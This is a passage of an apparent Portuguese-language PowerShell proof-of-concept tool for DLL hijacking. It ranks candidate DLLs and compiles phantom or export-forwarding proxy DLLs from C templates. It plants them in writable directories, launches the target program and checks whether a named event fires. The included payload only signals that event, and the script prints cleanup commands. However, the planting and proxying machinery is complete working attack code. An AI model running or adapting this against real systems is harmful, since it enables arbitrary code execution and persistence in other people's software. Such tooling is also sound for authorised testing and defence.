        "PHANTOM"       { "DLL fantasma!" }
        "WRITABLE_LOAD" { "Dir writable" }
        "PATH_WEAK"     { "PATH hijack" }
        "APP_DIR"       { "Plantavel no app dir" }
    }
    $color = switch ($v.Risk) {
        "CRITICO" { "Red" }
        "ALTO"    { "Magenta" }
        "MEDIO"   { "Yellow" }
        default   { "Gray" }
    }
    Write-Host ("  {0,4}  {1,-26} {2,-14} {3,-10} {4,-10} {5}" -f ($i+1), $v.Name, $v.HijackType, $v.Type, $v.Risk, $nota) -ForegroundColor $color
}

Write-Host ""
Write-Host "  N   = testa apenas a DLL de numero N" -ForegroundColor DarkYellow
Write-Host "  #N  = testa todas a partir de N ate encontrar uma vulneravel" -ForegroundColor DarkYellow
Write-Host "  Enter = testa apenas a #1" -ForegroundColor DarkYellow
do {
    $raw = Read-Host "  Selecao"
    if ([string]::IsNullOrWhiteSpace($raw)) { $raw = "1" }
    $raw = $raw.Trim()
    $scanAll = $raw.StartsWith("#")
    $numStr  = if ($scanAll) { $raw.Substring(1).Trim() } else { $raw }
    $selIdx  = 0
    $valid   = [int]::TryParse($numStr, [ref]$selIdx) -and $selIdx -ge 1 -and $selIdx -le $vulnSorted.Count
    if (-not $valid) {
        Write-Host "  [!] Entrada invalida. Use um numero (ex: 2) ou #numero (ex: #2)." -ForegroundColor Yellow
    }
} while (-not $valid)

if ($scanAll) {
    $tryOrder = @($vulnSorted[($selIdx-1)..($vulnSorted.Count-1)])
} else {
    $tryOrder = @($vulnSorted[$selIdx-1])
}

# --- FUNCOES DE COMPILACAO E VALIDACAO ----------------------------------------
function Get-DllExportNames([string]$path) {
    $out = [System.Collections.Generic.List[string]]::new()
    if (-not (Test-Path $path)) { return ,$out }
    [byte[]]$b = [System.IO.File]::ReadAllBytes($path)
    $pe2  = [BitConverter]::ToInt32($b, 0x3C)
    $mag2 = [BitConverter]::ToUInt16($b, $pe2 + 24)
    $ns2  = [BitConverter]::ToUInt16($b, $pe2 + 6)
    $opt2 = [BitConverter]::ToUInt16($b, $pe2 + 20)
    $ss2  = $pe2 + 24 + $opt2
    $dd2  = $pe2 + 24 + $(if ($mag2 -eq 0x20B) { 112 } else { 96 })
    function Rva2Off([uint32]$rva) {
        for ($k = 0; $k -lt $ns2; $k++) {
            $s = $ss2 + $k*40
            $va  = [BitConverter]::ToUInt32($b, $s+12)
            $vsz = [BitConverter]::ToUInt32($b, $s+16)
            $raw = [BitConverter]::ToUInt32($b, $s+20)
            if ($rva -ge $va -and $rva -lt ($va+$vsz)) { return [int]($raw+$rva-$va) }
        }; return -1
    }
    $expRVA = [BitConverter]::ToUInt32($b, $dd2)
    if ($expRVA -eq 0) { return ,$out }
    $expOff = Rva2Off $expRVA
    if ($expOff -lt 0) { return ,$out }
    $numNames   = [BitConverter]::ToUInt32($b, $expOff + 24)
    $nameTabRVA = [BitConverter]::ToUInt32($b, $expOff + 32)
    $nameTabOff = Rva2Off $nameTabRVA
    for ($i = 0; $i -lt [int]$numNames; $i++) {
        $nrva = [BitConverter]::ToUInt32($b, $nameTabOff + $i*4)
        $noff = Rva2Off $nrva
        if ($noff -lt 0) { continue }
        $sb = New-Object System.Text.StringBuilder
        $j = $noff
        while ($j -lt $b.Length -and $b[$j] -ne 0) { [void]$sb.Append([char]$b[$j]); $j++ }
        $out.Add($sb.ToString())
    }
    return ,$out
}

function Find-Compiler {
    $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
    if (Test-Path $vswhere) {
        $vsPath = (& $vswhere -latest -products * -property installationPath 2>$null) | Select-Object -First 1
        if ($vsPath) {
            $vcvars = Get-ChildItem "$vsPath\VC\Auxiliary\Build" -Filter "vcvars32.bat" -EA SilentlyContinue | Select-Object -First 1
            $cl     = Get-ChildItem "$vsPath\VC\Tools\MSVC" -Recurse -Filter "cl.exe" -EA SilentlyContinue |
                      Where-Object { $_.FullName -match "Hostx64.x86|Hostx86.x86" } | Select-Object -First 1
            if ($cl -and $vcvars) { return @{ Type="MSVC"; Path=$cl.FullName; Vcvars=$vcvars.FullName } }
        }
    }
    $candidates = @(
        @{ vsbase="${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019"; host="Hostx64\x86" },
        @{ vsbase="${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019"; host="Hostx86\x86" },
        @{ vsbase="${env:ProgramFiles}\Microsoft Visual Studio\2022";       host="Hostx64\x86" }
    )
    foreach ($c in $candidates) {
        if (-not (Test-Path $c.vsbase)) { continue }
        $vcvars = Get-ChildItem $c.vsbase -Recurse -Filter "vcvars32.bat" -EA SilentlyContinue | Select-Object -First 1
        $cl     = Get-ChildItem $c.vsbase -Recurse -Filter "cl.exe" -EA SilentlyContinue |
                  Where-Object { $_.FullName -match ($c.host -replace "\\",".") } | Select-Object -First 1
        if ($cl -and $vcvars) { return @{ Type="MSVC"; Path=$cl.FullName; Vcvars=$vcvars.FullName } }
    }
    foreach ($gcc in @("gcc.exe","i686-w64-mingw32-gcc.exe","x86_64-w64-mingw32-gcc.exe")) {
        $gccCmd = Get-Command $gcc -EA SilentlyContinue
        if ($gccCmd) { return @{ Type="GCC"; Path=$gccCmd.Source; Vcvars=$null } }
    }
    return $null
}

# Valida hijacking via named event
function Test-VulnDll {
    param([string]$exePath, [string]$evtName, [int]$waitSec = 6)
    $evt = $null
    try {
        $evt  = [System.Threading.EventWaitHandle]::new(
            $false, [System.Threading.EventResetMode]::ManualReset, $evtName)
        $proc = $null
        try { $proc = Start-Process -FilePath $exePath -PassThru -WindowStyle Minimized -EA Stop } catch { return $false }
        $signaled = $evt.WaitOne($waitSec * 1000)
        if ($proc -and -not $proc.HasExited) { try { $proc.Kill(); [void]$proc.WaitForExit(2000) } catch {} }
        return $signaled
    } finally {
        if ($evt) { $evt.Dispose() }
    }
}

# --- COMPILADOR ---------------------------------------------------------------
$compiler = Find-Compiler
if (-not $compiler) {
    Write-Bad "Nenhum compilador encontrado (cl.exe / gcc). Instale MinGW ou Visual Studio."
    exit 0
}
Write-Ok "Compilador : $($compiler.Type)  ->  $($compiler.Path)"

# --- TEMPLATES C --------------------------------------------------------------
# Template para DLL PHANTOM (sem proxy -- a DLL original nao existe)
$cTemplatePhantom = @'
#include <windows.h>
static volatile LONG g_fired = 0;
static DWORD WINAPI PayloadThread(LPVOID lp) {
    Sleep(300);
    HANDLE h = OpenEventA(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, "%%EVTNAME%%");
    if (h) { SetEvent(h); CloseHandle(h); }
    return 0;
}
BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hInst);
        if (InterlockedCompareExchange(&g_fired, 1, 0) == 0) {
            HANDLE ht = CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
            if (ht) CloseHandle(ht);
        }
    }
    return TRUE;
}
'@

# Template para DLL com proxy (quando a original existe -- precisa forwarder)
$cTemplateProxy = @'
#include <windows.h>
/* === EXPORT FORWARDERS (auto-gerados) === */
%%PRAGMAS%%
static volatile LONG g_fired = 0;
static DWORD WINAPI PayloadThread(LPVOID lp) {
    Sleep(300);
    HANDLE h = OpenEventA(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, "%%EVTNAME%%");
    if (h) { SetEvent(h); CloseHandle(h); }
    return 0;
}
BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hInst);
        if (InterlockedCompareExchange(&g_fired, 1, 0) == 0) {
            HANDLE ht = CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
            if (ht) CloseHandle(ht);
        }
    }
    return TRUE;
}
'@

# --- LOOP DE VALIDACAO --------------------------------------------------------
Write-Section "PoC -- VALIDACAO AUTOMATICA"
Write-Host "  Testando $($tryOrder.Count) DLL(s) em sequencia..." -ForegroundColor Cyan
Write-Host ""

$validatedDll = $null
$results      = [System.Collections.Generic.List[PSObject]]::new()
$testNum      = 0

foreach ($candidate in $tryOrder) {
    $testNum++
    $cn        = $candidate.Name
    $cb        = [System.IO.Path]::GetFileNameWithoutExtension($cn)
    $isPhantom = $candidate.HijackType -eq "PHANTOM"
    $hijackType= $candidate.HijackType

    # Determinar diretorio alvo para implantacao
    $implantDir = switch ($hijackType) {
        "PHANTOM"       { $ExeDir }
        "APP_DIR"       { $ExeDir }
        "PATH_WEAK"     { $candidate.Location }
        "WRITABLE_LOAD" { $candidate.Location }
        default         { $ExeDir }
    }

    $cDllOut   = Join-Path $implantDir $cn

    Write-Host ("  [{0,2}/{1}] {2,-28} ({3})" -f $testNum, $tryOrder.Count, $cn, $hijackType) -NoNewline -ForegroundColor Cyan

    # Verificar se o diretorio alvo e writable
    if (-not [DirWriteCheck]::CanWrite($implantDir)) {
        Write-Host " diretorio nao writable -- pulando." -ForegroundColor DarkGray
        $results.Add([PSCustomObject]@{ Name=$cn; Status="NotWritable"; HijackType=$hijackType })
        continue
    }

    # Para DLLs que precisam de proxy (a original existe), localizar e extrair exports
    $needsProxy = -not $isPhantom
    $cOrigBase  = "_orig_$cb"
    $cOrigDll   = "$cOrigBase.dll"
    $cOrigDst   = Join-Path $implantDir $cOrigDll
    $cOrigSrc   = $null
    $cExports   = [System.Collections.Generic.List[string]]::new()
    $cPragmas   = "/* sem exports -- DLL fantasma */"
    $cDefContent= "LIBRARY $($cb.ToUpper())`r`nEXPORTS"

    if ($needsProxy) {
        if ($optMagic -eq 0x20B) { $cPaths = @("sysnative","System32","SysWOW64") }
        else                      { $cPaths = @("SysWOW64","System32") }
        foreach ($__d in $cPaths) {
            $__p = [System.IO.Path]::Combine($env:SystemRoot, $__d, $cn)
            if ([System.IO.File]::Exists($__p)) { $cOrigSrc = $__p; break }
        }
        if (-not $cOrigSrc) {
            $foundInPath = Resolve-DllLocation $cn $ExeDir
            if ($foundInPath -and $foundInPath -ne $cDllOut) { $cOrigSrc = $foundInPath }
        }
        if (-not $cOrigSrc) {
            Write-Host " original nao encontrada -- tratando como phantom." -ForegroundColor DarkGray
            $needsProxy = $false
        } else {
            $cExports = Get-DllExportNames $cOrigSrc
            if ($cExports.Count -gt 0) {
                $cPragmas = ($cExports | ForEach-Object { "#pragma comment(linker, `"/export:$_=$cOrigBase.$_`")" }) -join "`n"
                $cDefContent += "`r`n" + (($cExports | ForEach-Object { "    $_ = $cOrigBase.$_" }) -join "`r`n")
            } else {
                $cPragmas = "/* sem exports encontrados */"
            }
        }
    }

    $evtName = "PSHijack_" + [System.Guid]::NewGuid().ToString("N")

    if ($needsProxy) {
        $cSource = $cTemplateProxy.Replace("%%PRAGMAS%%", $cPragmas).Replace("%%EVTNAME%%", $evtName)
    } else {
        $cSource = $cTemplatePhantom.Replace("%%EVTNAME%%", $evtName)
    }

    # Compila em temp
    $tmpDir  = Join-Path $env:TEMP "dll_hijack_poc_$(Get-Random)"
    New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
    $srcFile = Join-Path $tmpDir "poc.c"
    $defFile = Join-Path $tmpDir "poc.def"
    $dllFile = Join-Path $tmpDir $cn
    Set-Content -Path $srcFile -Value $cSource     -Encoding UTF8
    Set-Content -Path $defFile -Value $cDefContent -Encoding ASCII

    $compileOut = @()
    if ($compiler.Type -eq "MSVC") {
        $machineFlag = if ($optMagic -eq 0x20B) { "X64" } else { "X86" }
        $vcvarsName  = if ($optMagic -eq 0x20B) { "vcvars64.bat" } else { "vcvars32.bat" }
        $vcvarsPath  = Join-Path (Split-Path $compiler.Vcvars -Parent) $vcvarsName
        if (-not (Test-Path $vcvarsPath)) { $vcvarsPath = $compiler.Vcvars }
        if ($needsProxy) {
            $clCmd = "cl /nologo /LD /Fe:`"$dllFile`" /Fo:`"$tmpDir\poc.obj`" `"$srcFile`" /DEF:`"$defFile`" /link /DLL /MACHINE:$machineFlag"
        } else {
            $clCmd = "cl /nologo /LD /Fe:`"$dllFile`" /Fo:`"$tmpDir\poc.obj`" `"$srcFile`" /link /DLL /MACHINE:$machineFlag"
        }
        $batch   = "@echo off`r`ncall `"$vcvarsPath`" >nul 2>&1`r`n$clCmd`r`n"
        $batFile = Join-Path $tmpDir "build.bat"
        Set-Content -Path $batFile -Value $batch -Encoding ASCII
        $compileOut = cmd /c "`"$batFile`"" 2>&1
    } else {
        $bits   = if ($optMagic -eq 0x20B) { "-m64" } else { "-m32" }
        $killAt = if ($optMagic -eq 0x20B) { "" } else { "-Wl,--kill-at" }
        if ($needsProxy) {
            $compileOut = cmd /c "`"$($compiler.Path)`" $bits -shared -o `"$dllFile`" `"$srcFile`" `"$defFile`" -lkernel32 $killAt" 2>&1
        } else {
            $compileOut = cmd /c "`"$($compiler.Path)`" $bits -shared -o `"$dllFile`" `"$srcFile`" -lkernel32 $killAt" 2>&1
        }
    }

    if (-not (Test-Path $dllFile)) {
        Write-Host " falha na compilacao -- pulando." -ForegroundColor Yellow
        $compileOut | ForEach-Object { Write-Host "    $_" -ForegroundColor DarkGray }
        $results.Add([PSCustomObject]@{ Name=$cn; Status="CompileErr"; HijackType=$hijackType })
        Remove-Item $tmpDir -Recurse -Force -EA SilentlyContinue
        continue
    }

    # Implanta DLL PoC
    Copy-Item $dllFile -Destination $cDllOut -Force
    if ($needsProxy -and $cOrigSrc) {
        try { [System.IO.File]::Copy($cOrigSrc, $cOrigDst, $true) } catch {}
    }
    Remove-Item $tmpDir -Recurse -Force -EA SilentlyContinue

    # Valida: executa alvo e aguarda sinal do evento nomeado
    Write-Host " testando (10s)..." -NoNewline -ForegroundColor DarkCyan
    $vuln = Test-VulnDll $ExePath $evtName 10

    if ($vuln) {
        Write-Host " VULNERAVEL!" -ForegroundColor Green
        $results.Add([PSCustomObject]@{ Name=$cn; Status="VULNERAVEL"; HijackType=$hijackType })
        $validatedDll = $candidate
        $validatedDll | Add-Member -NotePropertyName "ImplantDir" -NotePropertyValue $implantDir -Force
        $validatedDll | Add-Member -NotePropertyName "NeedsProxy" -NotePropertyValue $needsProxy -Force
        break
    } else {
        Write-Host " sem disparo." -ForegroundColor Yellow
        $results.Add([PSCustomObject]@{ Name=$cn; Status="SemDisparo"; HijackType=$hijackType })
        Remove-Item $cDllOut  -Force -EA SilentlyContinue
        if ($needsProxy) { Remove-Item $cOrigDst -Force -EA SilentlyContinue }
    }
}

# --- RESULTADO FINAL ----------------------------------------------------------
Write-Host ""
Write-Section "RESULTADO DA VALIDACAO"
Write-Host ("  {0,-28} {1,-14} {2}" -f "DLL","Hijack Type","Resultado") -ForegroundColor DarkCyan
Write-Host ("  {0,-28} {1,-14} {2}" -f ("---"*9),("---"*4),("---"*13)) -ForegroundColor DarkGray
foreach ($r in $results) {
    $color = switch ($r.Status) {
        "VULNERAVEL"  { "Green"    }
        "SemDisparo"  { "Yellow"   }
        default       { "DarkGray" }
    }
    $label = switch ($r.Status) {
        "VULNERAVEL"  { "[OK] VULNERAVEL -- DLL carregada e evento sinalizado" }
        "SemDisparo"  { "[--] evento nao sinalizado"           }
        "CompileErr"  { "[??] falha de compilacao"              }
        "NoOriginal"  { "[??] original nao encontrada"          }
        "NotWritable" { "[!!] diretorio nao writable"           }
    }
    Write-Host ("  {0,-28} {1,-14} {2}" -f $r.Name, $r.HijackType, $label) -ForegroundColor $color
}
Write-Host ""

if ($validatedDll) {
    $vn        = $validatedDll.Name
    $vb        = [System.IO.Path]::GetFileNameWithoutExtension($vn)
    $vDir      = $validatedDll.ImplantDir
    $vDllOut   = Join-Path $vDir $vn
    $vOrigDst  = Join-Path $vDir "_orig_$vb.dll"
    $vProxy    = $validatedDll.NeedsProxy

    $now = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $modeLabel = if ($vProxy) { "PROXY (forwarder para original renomeada)" } else { "PHANTOM (DLL inexistente no sistema)" }
    $hijackDesc = switch ($validatedDll.HijackType) {
        "PHANTOM"       { "A DLL '$vn' e importada pelo binario mas NAO existe em nenhum local do search order. Um atacante pode criar esta DLL no diretorio do aplicativo e ela sera carregada automaticamente na proxima execucao." }
        "WRITABLE_LOAD" { "A DLL '$vn' e carregada de um diretorio com permissao de escrita ($vDir). Um atacante com acesso ao sistema pode substituir esta DLL por uma versao maliciosa." }
        "PATH_WEAK"     { "A DLL '$vn' pode ser plantada em um diretorio writable do PATH ($vDir) que e buscado pelo loader antes da localizacao real da DLL." }
        "APP_DIR"       { "O diretorio do aplicativo ($vDir) tem permissao de escrita. A DLL '$vn' pode ser plantada neste diretorio e sera carregada ANTES da versao legitima em System32." }
        default         { "A DLL '$vn' pode ser substituida ou plantada no diretorio do aplicativo." }
    }

    Write-Host ""
    Write-Host "  +==============================================================+" -ForegroundColor Green
    Write-Host "  |              DLL HIJACKING -- VULNERAVEL                      |" -ForegroundColor Green
    Write-Host "  +==============================================================+" -ForegroundColor Green
    Write-Host ""
    Write-Host "  EVIDENCIA DE EXPLORACAO" -ForegroundColor White
    Write-Host "  ---------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  Data/Hora       : $now" -ForegroundColor White
    Write-Host "  Binario alvo    : $ExeName" -ForegroundColor White
    Write-Host "  Caminho completo: $ExePath" -ForegroundColor White
    Write-Host "  Arquitetura     : $arch" -ForegroundColor White
    Write-Host "  Assinatura      : $($sigInfo.Status) [$($sigInfo.Signer)]" -ForegroundColor White
    Write-Host "  ---------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  DLL explorada   : $vn" -ForegroundColor White
    Write-Host "  Tipo de import  : $($validatedDll.Type)" -ForegroundColor White
    Write-Host "  Vetor hijacking : $($validatedDll.HijackType)" -ForegroundColor White
    Write-Host "  Risco           : $($validatedDll.Risk)" -ForegroundColor White
    Write-Host "  Modo PoC        : $modeLabel" -ForegroundColor White
    Write-Host "  ---------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host "  Dir implantacao : $vDir" -ForegroundColor White
    Write-Host "  PoC implantada  : $vDllOut" -ForegroundColor White
    if ($vProxy) {
    Write-Host "  Original renam. : $vOrigDst" -ForegroundColor White
    }
    Write-Host "  ---------------------------------------------------------------" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  DESCRICAO:" -ForegroundColor Yellow
    Write-Host "  $hijackDesc" -ForegroundColor White
    Write-Host ""
    Write-Host "  PROVA: o evento nomeado 'PSHijack_*' foi sinalizado pela DLL" -ForegroundColor Green
    Write-Host "  implantada, confirmando que o binario carregou e executou codigo" -ForegroundColor Green
    Write-Host "  arbitrario a partir da DLL plantada pelo atacante." -ForegroundColor Green
    Write-Host "  +==============================================================+" -ForegroundColor Green
    Write-Host ""
    Write-Host "  Remova apos o teste:" -ForegroundColor DarkYellow
    Write-Host "    Remove-Item `"$vDllOut`"" -ForegroundColor White
    if ($vProxy) {
    Write-Host "    Remove-Item `"$vOrigDst`"" -ForegroundColor White
    }
} else {
    Write-Host "  +==============================================================+" -ForegroundColor Red
    Write-Host "  |  NAO VULNERAVEL  --  Nenhum evento foi sinalizado.           |" -ForegroundColor Red
    Write-Host "  +==============================================================+" -ForegroundColor Red
    Write-Host ""
    Write-Warn "Possiveis causas:"
    Write-Info "  - AV/EDR bloqueou o carregamento da DLL"
    Write-Info "  - Processo encerrou antes do payload executar"
    Write-Info "  - DLL nao e carregada neste caminho de busca"
    Write-Info "  - Aplicacao valida integridade/assinatura das DLLs"
    Write-Info "  - SafeDllSearchMode impediu o carregamento do CWD/PATH"
}
